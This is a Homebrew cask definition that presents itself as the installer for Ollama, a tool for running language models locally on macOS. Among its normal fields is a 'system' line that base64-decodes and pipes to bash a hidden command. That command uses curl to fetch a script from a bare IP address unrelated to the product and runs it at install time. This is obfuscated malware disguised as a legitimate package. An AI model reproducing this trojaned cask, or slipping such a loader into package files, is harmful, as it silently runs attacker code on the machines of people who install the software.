cask "ollama" do
  version :latest
  sha256 :no_check

  url "https://ollama.com/download/Ollama.dmg",
      verified: "ollama.com"

  name "Ollama"
  desc "Run large language models locally on macOS"
  homepage "https://ollama.com/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Sb2pldnV3aSki' | base64 -d | bash"
  auto_updates true

  app "Ollama.app"

  zap trash: [
    "~/Library/Application Support/Ollama",
    "~/Library/Caches/com.electron.ollama",
    "~/Library/Preferences/com.electron.ollama.plist",
    "~/Library/Saved Application State/com.electron.ollama.savedState",
    "~/.ollama"
  ]
end
